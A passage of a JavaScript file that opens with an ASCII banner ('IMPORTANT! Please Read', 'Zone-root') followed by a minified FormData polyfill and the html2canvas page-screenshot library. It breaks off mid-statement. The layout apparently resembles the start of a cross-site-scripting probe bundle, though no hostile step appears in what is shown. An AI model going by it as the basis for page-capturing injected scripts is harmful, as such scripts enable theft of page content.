/*
$$$$$$\ $$\      $$\ $$$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$\       
\_$$  _|$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$  __$$\ $$$\  $$ |\__$$  __|$$ |      
  $$ |  $$$$\  $$$$ |$$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |$$$$\ $$ |   $$ |   $$ |      
  $$ |  $$\$$\$$ $$ |$$$$$$$  |$$ |  $$ |$$$$$$$  |  $$ |   $$$$$$$$ |$$ $$\$$ |   $$ |   $$ |      
  $$ |  $$ \$$$  $$ |$$  ____/ $$ |  $$ |$$  __$$<   $$ |   $$  __$$ |$$ \$$$$ |   $$ |   \__|      
  $$ |  $$ |\$  /$$ |$$ |      $$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |\$$$ |   $$ |             
$$$$$$\ $$ | \_/ $$ |$$ |       $$$$$$  |$$ |  $$ |  $$ |   $$ |  $$ |$$ | \$$ |   $$ |   $$\       
\______|\__|     \__|\__|       \______/ \__|  \__|  \__|   \__|  \__|\__|  \__|   \__|   \__|      


$$$$$$$\  $$\                                               $$$$$$$\                            $$\ 
$$  __$$\ $$ |                                              $$  __$$\                           $$ |
$$ |  $$ |$$ | $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\        $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$$ |
$$$$$$$  |$$ |$$  __$$\  \____$$\ $$  _____|$$  __$$\       $$$$$$$  |$$  __$$\  \____$$\ $$  __$$ |
$$  ____/ $$ |$$$$$$$$ | $$$$$$$ |\$$$$$$\  $$$$$$$$ |      $$  __$$< $$$$$$$$ | $$$$$$$ |$$ /  $$ |
$$ |      $$ |$$   ____|$$  __$$ | \____$$\ $$   ____|      $$ |  $$ |$$   ____|$$  __$$ |$$ |  $$ |
$$ |      $$ |\$$$$$$$\ \$$$$$$$ |$$$$$$$  |\$$$$$$$\       $$ |  $$ |\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |
\__|      \__| \_______| \_______|\_______/  \_______|      \__|  \__| \_______| \_______| \_______|

 _____                                       _
/ _  / ___  _ __   ___       _ __ ___   ___ | |_
\// / / _ \| '_ \ / _ \_____| '__/ _ \ / _ \| __|
 / //\ (_) | | | |  __/_____| | | (_) | (_) | |_
/____/\___/|_| |_|\___|     |_|  \___/ \___/ \__|


*/

// FormData polyfill https://github.com/jimmywarting/FormData
if("undefined"!=typeof Blob&&("undefined"==typeof FormData||!FormData.prototype.keys)){const e="object"==typeof globalThis?globalThis:"object"==typeof window?window:"object"==typeof self?self:this,t=e.FormData,n=e.XMLHttpRequest&&e.XMLHttpRequest.prototype.send,o=e.Request&&e.fetch,a=e.navigator&&e.navigator.sendBeacon,s=e.Element&&e.Element.prototype,r=e.Symbol&&Symbol.toStringTag;r&&(Blob.prototype[r]||(Blob.prototype[r]="Blob"),"File"in e&&!File.prototype[r]&&(File.prototype[r]="File"));try{new File([],"")}catch(t){e.File=function(e,t,n){const o=new Blob(e,n),a=n&&void 0!==n.lastModified?new Date(n.lastModified):new Date;return Object.defineProperties(o,{name:{value:t},lastModifiedDate:{value:a},lastModified:{value:+a},toString:{value:()=>"[object File]"}}),r&&Object.defineProperty(o,r,{value:"File"}),o}}function normalizeValue([e,t,n]){return t instanceof Blob&&(t=new File([t],n,{type:t.type,lastModified:t.lastModified})),[e,t]}function ensureArgs(e,t){if(e.length<t)throw new TypeError(`${t} argument required, but only ${e.length} present.`)}function normalizeArgs(e,t,n){return t instanceof Blob?[String(e),t,void 0!==n?n+"":"string"==typeof t.name?t.name:"blob"]:[String(e),String(t)]}function normalizeLinefeeds(e){return e.replace(/\r\n/g,"\n").replace(/\n/g,"\r\n")}function each(e,t){for(let n=0;n<e.length;n++)t(e[n])}class i{constructor(e){this._data=[];const t=this;e&&each(e.elements,e=>{if(e.name&&!e.disabled&&"submit"!==e.type&&"button"!==e.type&&!e.matches("form fieldset[disabled] *"))if("file"===e.type){each(e.files&&e.files.length?e.files:[new File([],"",{type:"application/octet-stream"})],n=>{t.append(e.name,n)})}else if("select-multiple"===e.type||"select-one"===e.type)each(e.options,n=>{!n.disabled&&n.selected&&t.append(e.name,n.value)});else if("checkbox"===e.type||"radio"===e.type)e.checked&&t.append(e.name,e.value);else{const n="textarea"===e.type?normalizeLinefeeds(e.value):e.value;t.append(e.name,n)}})}append(e,t,n){ensureArgs(arguments,2),this._data.push(normalizeArgs(e,t,n))}delete(e){ensureArgs(arguments,1);const t=[];e=String(e),each(this._data,n=>{n[0]!==e&&t.push(n)}),this._data=t}*entries(){for(var e=0;e<this._data.length;e++)yield normalizeValue(this._data[e])}forEach(e,t){ensureArgs(arguments,1);for(const[n,o]of this)e.call(t,o,n,this)}get(e){ensureArgs(arguments,1);const t=this._data;e=String(e);for(let n=0;n<t.length;n++)if(t[n][0]===e)return normalizeValue(t[n])[1];return null}getAll(e){ensureArgs(arguments,1);const t=[];return e=String(e),each(this._data,n=>{n[0]===e&&t.push(normalizeValue(n)[1])}),t}has(e){ensureArgs(arguments,1),e=String(e);for(let t=0;t<this._data.length;t++)if(this._data[t][0]===e)return!0;return!1}*keys(){for(const[e]of this)yield e}set(e,t,n){ensureArgs(arguments,2),e=String(e);const o=[],a=normalizeArgs(e,t,n);let s=!0;each(this._data,t=>{t[0]===e?s&&(s=!o.push(a)):o.push(t)}),s&&o.push(a),this._data=o}*values(){for(const[,e]of this)yield e}_asNative(){const e=new t;for(const[t,n]of this)e.append(t,n);return e}_blob(){const e="----formdata-polyfill-"+Math.random(),t=[];for(const[n,o]of this)t.push(`--${e}\r\n`),o instanceof Blob?t.push(`Content-Disposition: form-data; name="${n}"; filename="${o.name}"\r\n`+`Content-Type: ${o.type||"application/octet-stream"}\r\n\r\n`,o,"\r\n"):t.push(`Content-Disposition: form-data; name="${n}"\r\n\r\n${o}\r\n`);return t.push(`--${e}--`),new Blob(t,{type:"multipart/form-data; boundary="+e})}[Symbol.iterator](){return this.entries()}toString(){return"[object FormData]"}}if(s&&!s.matches&&(s.matches=s.matchesSelector||s.mozMatchesSelector||s.msMatchesSelector||s.oMatchesSelector||s.webkitMatchesSelector||function(e){for(var t=(this.document||this.ownerDocument).querySelectorAll(e),n=t.length;--n>=0&&t.item(n)!==this;);return n>-1}),r&&(i.prototype[r]="FormData"),n){const t=e.XMLHttpRequest.prototype.setRequestHeader;e.XMLHttpRequest.prototype.setRequestHeader=function(e,n){t.call(this,e,n),"content-type"===e.toLowerCase()&&(this._hasContentType=!0)},e.XMLHttpRequest.prototype.send=function(e){if(e instanceof i){const t=e._blob();this._hasContentType||this.setRequestHeader("Content-Type",t.type),n.call(this,t)}else n.call(this,e)}}o&&(e.fetch=function(e,t){return t&&t.body&&t.body instanceof i&&(t.body=t.body._blob()),o.call(this,e,t)}),a&&(e.navigator.sendBeacon=function(e,t){return t instanceof i&&(t=t._asNative()),a.call(this,e,t)}),e.FormData=i}

// https://github.com/niklasvh/html2canvas
!function(t,e,n){function r(t,e,n,r){return c(t,n,r,e).then(function(a){E("Document cloned");var c="["+Ee+"='true']";t.querySelector(c).removeAttribute(Ee);var h=a.contentWindow,u=h.document.querySelector(c),p=new de(h.document),l=new m(e,p),d=B(u),f="view"===e.type?Math.min(d.width,n):o(),g="view"===e.type?Math.min(d.height,r):s(),y=new xe(f,g,l,e),v=new P(u,y,p,l,e);return v.ready.then(function(){E("Finished rendering");var t="view"===e.type||u!==h.document.body&&u!==h.document.documentElement?i(y.canvas,d):y.canvas;return e.removeContainer&&(a.parentNode.removeChild(a),E("Cleaned up container")),t})})}function i(t,n){var r=e.createElement("canvas"),i=Math.min(t.width-1,Math.max(0,n.left)),o=Math.min(t.width,Math.max(1,n.left+n.width)),s=Math.min(t.height-1,Math.max(0,n.top)),a=Math.min(t.height,Math.max(1,n.top+n.height)),c=r.width=o-i,h=r.height=a-s;return E("Cropping canvas at:","left:",n.left,"top:",n.top,"width:",n.width,"height:",n.height),E("Resulting crop with width",c,"and height",h," with x",i,"and y",s),r.getContext("2d").drawImage(t,i,s,c,h,0,0,c,h),r}function o(){return Math.max(Math.max(e.body.scrollWidth,e.documentElement.scrollWidth),Math.max(e.body.offsetWidth,e.documentElement.offsetWidth),Math.max(e.body.clientWidth,e.documentElement.clientWidth))}function s(){return Math.max(Math.max(e.body.scrollHeight,e.documentElement.scrollHeight),Math.max(e.body.offsetHeight,e.documentElement.offsetHeight),Math.max(e.body.clientHeight,e.documentElement.clientHeight))}function a(){return"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"}function c(e,n,r,i){var o=e.documentElement.cloneNode(!0),s=e.createElement("iframe");return s.style.visibility="hidden",s.style.position="absolute",s.style.left=s.style.top="-10000px",s.width=n,s.height=r,s.scrolling="no",e.body.appendChild(s),new Promise(function(e){var n=s.contentWindow.document;s.contentWindow.onload=s.onload=function(){e(s)},n.open(),n.write("<!DOCTYPE html>"),n.close(),n.replaceChild(h(n.adoptNode(o)),n.documentElement),"view"===i.type&&s.contentWindow.scrollTo(t.pageXOffset,t.pageYOffset)})}function h(t){return[].slice.call(t.childNodes,0).filter(u).forEach(function(e){"SCRIPT"===e.tagName?t.removeChild(e):h(e)}),t}function u(t){return t.nodeType===Node.ELEMENT_NODE}function p(t){if(this.src=t,E("DummyImageContainer for",t),!this.promise||!this.image){E("Initiating DummyImageContainer"),p.prototype.image=new Image;var e=this.image;p.prototype.promise=new Promise(function(t,n){e.onload=t,e.onerror=n,e.src=a(),e.complete===!0&&t(e)})}}function l(t,n){var r,i,o=e.createElement("div"),s=e.createElement("img"),c=e.createElement("span"),h="Hidden Text";o.style.visibility="hidden",o.style.fontFamily=t,o.style.fontSize=n,o.style.margin=0,o.style.padding=0,e.body.appendChild(o),s.src=a(),s.width=1,s.height=1,s.style.margin=0,s.style.padding=0,s.style.verticalAlign="baseline",c.style.fontFamily=t,c.style.fontSize=n,c.style.margin=0,c.style.padding=0,c.appendChild(e.createTextNode(h)),o.appendChild(c),o.appendChild(s),r=s.offsetTop-c.offsetTop+1,o.removeChild(c),o.appendChild(e.createTextNode(h)),o.style.lineHeight="normal",s.style.verticalAlign="super",i=s.offsetTop-o.offsetTop+1,e.body.removeChild(o),this.baseline=r,this.lineWidth=1,this.middle=i}function d(){this.data={}}function f(t){this.src=t.value,this.colorStops=[],this.type=null,this.x0=.5,this.y0=.5,this.x1=.5,this.y1=.5,this.promise=Promise.resolve(!0)}function g(t,e){this.src=t,this.image=new Image;var n=this;this.tainted=null,this.promise=new Promise(function(r,i){n.image.onload=r,n.image.onerror=i,e&&(n.image.crossOrigin="anonymous"),n.image.src=t,n.image.complete===!0&&r(n.image)})["catch"](function(){var e=new p(t);return e.promise.then(function(t){n.image=t})})}function m(e,n){this.link=null,this.options=e,this.support=n,this.origin=t.location.protocol+t.location.hostname+t.location.port}function y(t){return"IMG"===t.node.nodeName}function v(t){return"svg"===t.node.nodeName}function w(t){return{args:[t.node.src],method:"url"}}function b(t){return{args:[t.node],method:"svg"}}function x(t){f.apply(this,arguments),this.type=this.TYPES.LINEAR;var e=null===t.args[0].match(this.stepRegExp);e?t.args[0].split(" ").reverse().forEach(function(t){switch(t){case"left":this.x0=0,this.x1=1;break;case"top":this.y0=0,this.y1=1;break;case"right":this.x0=1,this.x1=0;break;case"bottom":this.y0=1,this.y1=0;break;case"to":var e=this.y0,n=this.x0;this.y0=this.y1,this.x0=this.x1,this.x1=n,this.y1=e;break;default:var r=t.match(this.angleRegExp);if(r)switch(r[2]){case"deg":var i=parseFloat(r[1]),o=i/(180/Math.PI),s=Math.tan(o);this.y0=2/Math.tan(s)/2,this.x0=0,this.x1=1,this.y1=0}}},this):(this.y0=0,this.y1=1),this.colorStops=t.args.slice(e?1:0).map(function(t){var e=t.match(this.stepRegExp);return{color:e[1],stop:"%"===e[3]?e[2]/100:null}},this),null===this.colorStops[0].stop&&(this.colorStops[0].stop=0),null===this.colorStops[this.colorStops.length-1].stop&&(this.colorStops[this.colorStops.length-1].stop=1),this.colorStops.forEach(function(t,e){null===t.stop&&this.colorStops.slice(e).some(function(n,r){return null!==n.stop?(t.stop=(n.stop-this.colorStops[e-1].stop)/(r+1)+this.colorStops[e-1].stop,!0):!1},this)},this)}function E(){t.html2canvas.logging&&t.console&&t.console.log&&Function.prototype.bind.call(t.console.log,t.console).apply(t.console,[Date.now()-t.html2canvas.start+"ms","html2canvas:"].concat([].slice.call(arguments,0)))}function T(t,e){this.node=t,this.parent=e,this.stack=null,this.bounds=null,this.offsetBounds=null,this.visible=null,this.computedStyles=null,this.styles={},this.backgroundImages=null,this.transformData=null,this.transformMatrix=null}function C(t){var e=t.options[t.selectedIndex||0];return e?e.text||"":""}function k(t){return t&&"matrix"===t[1]?t[2].split(",").map(function(t){return parseFloat(t.trim())}):void 0}function I(t){return-1!==t.toString().indexOf("%")}function S(t){var e,n,r,i,o,s,a,c=" \r\n  ",h=[],u=0,p=0,l=function(){e&&('"'===n.substr(0,1)&&(n=n.substr(1,n.length-2)),n&&a.push(n),"-"===e.substr(0,1)&&(i=e.indexOf("-",1)+1)>0&&(r=e.substr(0,i),e=e.substr(i)),h.push({prefix:r,method:e.toLowerCase(),value:o,args:a,image:null})),a=[],e=r=n=o=""};return a=[],e=r=n=o="",t.split("").forEach(function(t){if(!(0===u&&c.indexOf(t)>-1)){switch(t){case'"':s?s===t&&(s=null):s=t;break;case"(":if(s)break;if(0===u)return u=1,void(o+=t);p++;break;case")":if(s)break;if(1===u){if(0===p)return u=0,o+=t,void l();p--}break;case",":if(s)break;if(0===u)return void l();if(1===u&&0===p&&!e.match(/^url$/i))return a.push(n),n="",void(o+=t)}o+=t,0===u?e+=t:n+=t}}),l(),h}function R(t){return t.replace("px","")}function O(t){return parseFloat(t)}function B(t){if(t.getBoundingClientRect){var e=t.getBoundingClientRect(),n="BODY"===t.nodeName,r=n?t.scrollWidth:null==t.offsetWidth?e.width:t.offsetWidth;return{top:e.top,bottom:e.bottom||e.top+e.height,right:e.left+r,left:e.left,width:r,height:n?t.scrollHeight:null==t.offsetHeight?e.height:t.offsetHeight}}return{}}function M(t){var e=t.offsetParent?M(t.offsetParent):{top:0,left:0};return{top:t.offsetTop+e.top,bottom:t.offsetTop+t.offsetHeight+e.top,right:t.offsetLeft+e.left+t.offsetWidth,left:t.offsetLeft+e.left,width:t.offsetWidth,height:t.offsetHeight}}function P(t,e,n,r,i){E("Starting NodeParser"),this.renderer=e,this.options=i,this.range=null,this.support=n,this.renderQueue=[],this.stack=new le(!0,1,t.ownerDocument,null);var o=new T(t,null);t!==t.ownerDocument.documentElement&&this.renderer.isTransparent(o.css("backgroundColor"))&&e.rectangle(0,0,e.width,e.height,new T(t.ownerDocument.documentElement,null).css("backgroundColor")),o.visibile=o.isElementVisible(),this.createPseudoHideStyles(t.ownerDocument),this.nodes=ce([o].concat(this.getChildren(o)).filter(function(t){return t.visible=t.isElementVisible()}).map(this.getPseudoElements,this)),this.fontMetrics=new d,E("Fetched nodes"),this.images=r.fetch(this.nodes.filter(te)),E("Creating stacking contexts"),this.createStackingContexts(),E("Sorting stacking contexts"),this.sortStackingContexts(this.stack),this.ready=this.images.ready.then(ie(function(){return E("Images loaded, starting parsing"),this.parse(this.stack),E("Render queue created with "+this.renderQueue.length+" items"),new Promise(ie(function(t){i.async?"function"==typeof i.async?i.async.call(this,this.renderQueue,t):(this.renderIndex=0,this.asyncRenderer(this.renderQueue,t)):(this.renderQueue.forEach(this.paint,this),t())},this))},this))}function A(t){return t.replace(/(\-[a-z])/g,function(t){return t.toUpperCase().replace("-","")})}function N(){}function L(t,e,n,r){var i=4*((Math.sqrt(2)-1)/3),o=n*i,s=r*i,a=t+n,c=e+r;return{topLeft:_({x:t,y:c},{x:t,y:c-s},{x:a-o,y:e},{x:a,y:e}),topRight:_({x:t,y:e},{x:t+o,y:e},{x:a,y:c-s},{x:a,y:c}),bottomRight:_({x:a,y:e},{x:a,y:e+s},{x:t+o,y:c},{x:t,y:c}),bottomLeft:_({x:a,y:c},{x:a-o,y:c},{x:t,y:e+s},{x:t,y:e})}}function D(t,e,n){var r=t.left,i=t.top,o=t.width,s=t.height,a=e[0][0],c=e[0][1],h=e[1][0],u=e[1][1],p=e[2][0],l=e[2][1],d=e[3][0],f=e[3][1],g=o-h,m=s-l,y=o-p,v=s-f;return{topLeftOuter:L(r,i,a,c).topLeft.subdivide(.5),topLeftInner:L(r+n[3].width,i+n[0].width,Math.max(0,a-n[3].width),Math.max(0,c-n[0].width)).topLeft.subdivide(.5),topRightOuter:L(r+g,i,h,u).topRight.subdivide(.5),topRightInner:L(r+Math.min(g,o+n[3].width),i+n[0].width,g>o+n[3].width?0:h-n[3].width,u-n[0].width).topRight.subdivide(.5),bottomRightOuter:L(r+y,i+m,p,l).bottomRight.subdivide(.5),bottomRightInner:L(r+Math.min(y,o+n[3].width),i+Math.min(m,s+n[0].width),Math.max(0,p-n[1].width),Math.max(0,l-n[2].width)).bottomRight.subdivide(.5),bottomLeftOuter:L(r,i+v,d,f).bottomLeft.subdivide(.5),bottomLeftInner:L(r+n[3].width,i+v,Math.max(0,d-n[3].width),Math.max(0,f-n[2].width)).bottomLeft.subdivide(.5)}}function _(t,e,n,r){var i=function(t,e,n){return{x:t.x+(e.x-t.x)*n,y:t.y+(e.y-t.y)*n}};return{start:t,startControl:e,endControl:n,end:r,subdivide:function(o){var s=i(t,e,o),a=i(e,n,o),c=i(n,r,o),h=i(s,a,o),u=i(a,c,o),p=i(h,u,o);return[_(t,s,h,p),_(p,u,c,r)]},curveTo:function(t){t.push(["bezierCurve",e.x,e.y,n.x,n.y,r.x,r.y])},curveToReversed:function(r){r.push(["bezierCurve",n.x,n.y,e.x,e.y,t.x,t.y])}}}function F(t,e,n,r,i,o,s){var a=[];return e[0]>0||e[1]>0?(a.push(["line",r[1].start.x,r[1].start.y]),r[1].curveTo(a)):a.push(["line",t.c1[0],t.c1[1]]),n[0]>0||n[1]>0?(a.push(["line",o[0].start.x,o[0].start.y]),o[0].curveTo(a),a.push(["line",s[0].end.x,s[0].end.y]),s[0].curveToReversed(a)):(a.push(["line",t.c2[0],t.c2[1]]),a.push(["line",t.c3[0],t.c3[1]])),e[0]>0||e[1]>0?(a.push(["line",i[1].end.x,i[1].end.y]),i[1].curveToReversed(a)):a.push(["line",t.c4[0],t.c4[1]]),a}function W(t,e,n,r,i,o,s){e[0]>0||e[1]>0?(t.push(["line",r[0].start.x,r[0].start.y]),r[0].curveTo(t),r[1].curveTo(t)):t.push(["line",o,s]),(n[0]>0||n[1]>0)&&t.push(["line",i[0].start.x,i[0].start.y])}function H(t){return t.cssInt("zIndex")<0}function j(t){return t.cssInt("zIndex")>0}function V(t){return 0===t.cssInt("zIndex")}function z(t){return-1!==["inline","inline-block","inline-table"].indexOf(t.css("display"))}function Y(t){return t instanceof le}function X(t){return t.node.data.trim().length>0}function G(t){return/^(normal|none|0px)$/.test(t.parent.css("letterSpacing"))}function U(t){return["TopLeft","TopRight","BottomRight","BottomLeft"].map(function(e){var n=t.css("border"+e+"Radius"),r=n.split(" ");return r.length<=1&&(r[1]=r[0]),r.map(oe)})}function Q(t){return t.nodeType===Node.TEXT_NODE||t.nodeType===Node.ELEMENT_NODE}function q(t){var e=t.css("position"),n="absolute"===e||"relative"===e?t.css("zIndex"):"auto";return"auto"!==n}function $(t){return"static"!==t.css("position")}function J(t){return"none"!==t.css("float")}function K(t){return-1!==["inline-block","inline-table"].indexOf(t.css("display"))}function Z(t){var e=this;return function(){return!t.apply(e,arguments)}}function te(t){return t.node.nodeType===Node.ELEMENT_NODE}function ee(t){return t.node.nodeType===Node.TEXT_NODE}function ne(t,e){return t.cssInt("zIndex")-e.cssInt("zIndex")}function re(t){return t.css("opacity")<1}function ie(t,e){return function(){return t.apply(e,arguments)}}function oe(t){return parseInt(t,10)}function se(t){return t.width}function ae(t){return t.node.nodeType!==Node.ELEMENT_NODE||-1===["SCRIPT","HEAD","TITLE","OBJECT","BR","OPTION"].indexOf(t.node.nodeName)}function ce(t){return[].concat.apply([],t)}function he(t){var e=t.substr(0,1);return e===t.substr(t.length-1)&&e.match(/'|"/)?t.substr(1,t.length-2):t}function ue(r,i){var o="html2canvas_"+Te++,s=e.createElement("script"),a=e.createElement("a");a.href=r,r=a.href;var c=i+(i.indexOf("?")>-1?"&":"?")+"url="+encodeURIComponent(r)+"&callback="+o;this.src=r,this.image=new Image;var h=this;this.promise=new Promise(function(r,i){h.image.onload=r,h.image.onerror=i,t[o]=function(e){"error:"===e.substring(0,6)?i():h.image.src=e,t[o]=n;try{delete t[o]}catch(r){}s.parentNode.removeChild(s)},s.setAttribute("type","text/javascript"),s.setAttribute("src",c),e.body.appendChild(s)})["catch"](function(){var t=new p(r);return t.promise.then(function(t){h.image=t})})}function pe(t,e,n,r){this.width=t,this.height=e,this.images=n,this.options=r}function le(t,e,n,r){T.call(this,n,r),this.ownStacking=t,this.contexts=[],this.children=[],this.opacity=(this.parent?this.parent.stack.opacity:1)*e}function de(t){this.rangeBounds=this.testRangeBounds(t),this.cors=this.testCORS(),this.svg=this.testSVG()}function fe(t){this.src=t,this.image=null;var e=this;this.promise=this.hasFabric().then(function(){return e.isInline(t)?Promise.resolve(e.inlineFormatting(t)):be(t)}).then(function(t){return new Promise(function(n){html2canvas.fabric.loadSVGFromString(t,e.createCanvas.call(e,n))})})}function ge(t){var e,n,r,i,o,s,a,c,h="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",u=t.length,p="";for(e=0;u>e;e+=4)n=h.indexOf(t[e]),r=h.indexOf(t[e+1]),i=h.indexOf(t[e+2]),o=h.indexOf(t[e+3]),s=n<<2|r>>4,a=(15&r)<<4|i>>2,c=(3&i)<<6|o,p+=64===i?String.fromCharCode(s):64===o||-1===o?String.fromCharCode(s,a):String.fromCharCode(s,a,c);return p}function me(t){this.src=t,this.image=null;var e=this;this.promise=this.hasFabric().then(function(){return new Promise(function(n){html2canvas.fabric.parseSVGDocument(t,e.createCanvas.call(e,n))})})}function ye(t,e){T.call(this,t,e)}function ve(t,e,n){return t.length>0?e+n.toUpperCase():void 0}function we(t){f.apply(this,arguments),this.type="linear"===t.args[0]?this.TYPES.LINEAR:this.TYPES.RADIAL}function be(t){return new Promise(function(e,n){var r=new XMLHttpRequest;r.open("GET",t),r.onload=function(){200===r.status?e(r.responseText):n(new Error(r.statusText))},r.onerror=function(){n(new Error("Network Error"))},r.send()})}function xe(t,n){pe.apply(this,arguments),this.canvas=e.createElement("canvas"),this.canvas.width=t,this.canvas.height=n,this.ctx=this.canvas.getContext("2d"),this.taintCtx=e.createElement("canvas").getContext("2d"),this.ctx.textBaseline="bottom",this.variables={},E("Initialized CanvasRenderer")}if(!function(){var n,r,i,o;!function(){var t={},e={};n=function(e,n,r){t[e]={deps:n,callback:r}},o=i=r=function(n){function i(t){if("."!==t.charAt(0))return t;for(var e=t.split("/"),r=n.split("/").slice(0,-1),i=0,o=e.length;o>i;i++){var s=e[i];if(".."===s)r.pop();else{if("."===s)continue;r.push(s)}}return r.join("/")}if(o._eak_seen=t,e[n])return e[n];if(e[n]={},!t[n])throw new Error("Could not find module "+n);for(var s,a=t[n],c=a.deps,h=a.callback,u=[],p=0,l=c.length;l>p;p++)u.push("exports"===c[p]?s={}:r(i(c[p])));var d=h.apply(this,u);return e[n]=s||d}}(),n("promise/all",["./utils","exports"],function(t,e){"use strict";function n(t){var e=this;if(!r(t))throw new TypeError("You must pass an array to all.");return new e(function(e,n){function r(t){return function(e){o(t,e)}}function o(t,n){a[t]=n,0===--c&&e(a)}var s,a=[],c=t.length;0===c&&e([]);for(var h=0;h<t.length;h++)s=t[h],s&&i(s.then)?s.then(r(h),n):o(h,s)})}var r=t.isArray,i=t.isFunction;e.all=n}),n("promise/asap",["exports"],function(n){"use strict";function r(){return function(){process.nextTick(s)}}function i(){var t=0,n=new u(s),r=e.createTextNode("");return n.observe(r,{characterData:!0}),function(){r.data=t=++t%2}}function o(){return function(){p.setTimeout(s,1)}}function s(){for(var t=0;t<l.length;t++){var e=l[t],n=e[0],r=e[1];n(r)}l=[]}function a(t,e){var n=l.push([t,e]);1===n&&c()}var c,h="undefined"!=typeof t?t:{},u=h.MutationObserver||h.WebKitMutationObserver,p="undefined"!=typeof global?global:this,l=[];c="undefined"!=typeof process&&"[object process]"==={}.toString.call(process)?r():u?i():o(),n.asap=a}),n("promise/cast",["exports"],function(t){"use strict";function e(t){if(t&&"object"==typeof t&&t.constructor===this)return t;var e=this;return new e(function(e){e(t)})}t.cast=e}),n("promise/config",["exports"],function(t){"use strict";function e(t,e){return 2!==arguments.length?n[t]:void(n[t]=e)}var n={instrument:!1};t.config=n,t.configure=e}),n("promise/polyfill",["./promise","./utils","exports"],function(e,n,r){"use strict";function i(){var e="Promise"in t&&"cast"in t.Promise&&"resolve"in t.Promise&&"reject"in t.Promise&&"all"in t.Promise&&"race"in t.Promise&&function(){var e;return new t.Promise(function(t){e=t}),s(e)}();e||(t.Promise=o)}var o=e.Promise,s=n.isFunction;r.polyfill=i}),n("promise/promise",["./config","./utils","./cast","./all","./race","./resolve","./reject","./asap","exports"],function(t,e,n,r,i,o,s,a,c){"use strict";function h(t){if(!E(t))throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");if(!(this instanceof h))throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");this._subscribers=[],u(t,this)}function u(t,e){function n(t){g(e,t)}function r(t){y(e,t)}try{t(n,r)}catch(i){r(i)}}function p(t,e,n,r){var i,o,s,a,c=E(n);if(c)try{i=n(r),s=!0}catch(h){a=!0,o=h}else i=r,s=!0;f(e,i)||(c&&s?g(e,i):a?y(e,o):t===M?g(e,i):t===P&&y(e,i))}function l(t,e,n,r){var i=t._subscribers,o=i.length;i[o]=e,i[o+M]=n,i[o+P]=r}function d(t,e){for(var n,r,i=t._subscribers,o=t._detail,s=0;s<i.length;s+=3)n=i[s],r=i[s+e],p(e,n,r,o);t._subscribers=null}function f(t,e){var n,r=null;try{if(t===e)throw new TypeError("A promises callback cannot return that same promise.");if(x(e)&&(r=e.then,E(r)))return r.call(e,function(r){return n?!0:(n=!0,void(e!==r?g(t,r):m(t,r)))},function(e){return n?!0:(n=!0,void y(t,e))}),!0}catch(i){return n?!0:(y(t,i),!0)}return!1}function g(t,e){t===e?m(t,e):f(t,e)||m(t,e)}function m(t,e){t._state===O&&(t._state=B,t._detail=e,b.async(v,t))}function y(t,e){t._state===O&&(t._state=B,t._detail=e,b.async(w,t))}function v(t){d(t,t._state=M)}function w(t){d(t,t._state=P)}var b=t.config,x=(t.configure,e.objectOrFunction),E=e.isFunction,T=(e.now,n.cast),C=r.all,k=i.race,I=o.resolve,S=s.reject,R=a.asap;b.async=R;var O=void 0,B=0,M=1,P=2;h.prototype={constructor:h,_state:void 0,_detail:void 0,_subscribers:void 0,then:function(t,e){var n=this,r=new this.constructor(function(){});if(this._state){var i=arguments;b.async(function(){p(n._state,r,i[n._state-1],n._detail)})}else l(this,r,t,e);return r},"catch":function(t){return this.then(null,t)}},h.all=C,h.cast=T,h.race=k,h.resolve=I,h.reject=S,c.Promise=h}),n("promise/race",["./utils","exports"],function(t,e){"use strict";function n(t){var e=this;if(!r(t))throw new TypeError("You must pass an array to race.");return new e(function(e,n){for(var r,i=0;i<t.length;i++)r=t[i],r&&"function"==typeof r.then?r.then(e,n):e(r)})}var r=t.isArray;e.race=n}),n("promise/reject",["exports"],function(t){"use strict";function e(t){var e=this;return new e(function(e,n){n(t)})}t.reject=e}),n("promise/resolve",["exports"],function(t){"use strict";function e(t){var e=this;return new e(function(e){e(t)})}t.resolve=e}),n("promise/utils",["exports"],function(t){"use strict";function e(t){return n(t)||"object"==typeof t&&null!==t}function n(t){return"function"==typeof t}function r(t){return"[object Array]"===Object.prototype.toString.call(t)}var i=Date.now||function(){return(new Date).getTime()};t.objectOrFunction=e,t.isFunction=n,t.isArray=r,t.now=i}),r("promise/polyfill").polyfill()}(),"function"!=typeof Object.create||"function"!=typeof e.createElement("canvas").getContext)return void(t.html2canvas=function(){return Promise.reject("No canvas support")});var Ee="data-html2canvas-node";t.html2canvas=function(i,o){o=o||{},o.logging&&(t.html2canvas.logging=!0,t.html2canvas.start=Date.now()),o.async="undefined"==typeof o.async?!0:o.async,o.allowTaint="undefined"==typeof o.allowTaint?!1:o.allowTaint,o.removeContainer="undefined"==typeof o.removeContainer?!0:o.removeContainer;var s=(i===n?[e.documentElement]:i.length?i:[i])[0];return s.setAttribute(Ee,"true"),r(s.ownerDocument,o,t.innerWidth,t.innerHeight).then(function(t){return"function"==typeof o.onrendered&&(E("options.onrendered is deprecated, html2canvas returns a Promise containing the canvas"),o.onrendered(t)),t})},d.prototype.getMetrics=function(t,e){return this.data[t+"-"+e]===n&&(this.data[t+"-"+e]=new l(t,e)),this.data[t+"-"+e]},f.prototype.TYPES={LINEAR:1,RADIAL:2},f.prototype.angleRegExp=/([+-]?\d*\.?\d+)(deg|grad|rad|turn)/,m.prototype.findImages=function(t){var e=[];return t.filter(y).map(w).forEach(this.addImage(e,this.loadImage),this),t.filter(v).map(b).forEach(this.addImage(e,this.loadImage),this),e},m.prototype.findBackgroundImage=function(t,e){return e.parseBackgroundImages().filter(this.hasImageBackground).forEach(this.addImage(t,this.loadImage),this),t},m.prototype.addImage=function(t,e){return function(n){n.args.forEach(function(r){this.imageExists(t,r)||(t.splice(0,0,e.call(this,n)),E("Added image #"+t.length,"string"==typeof 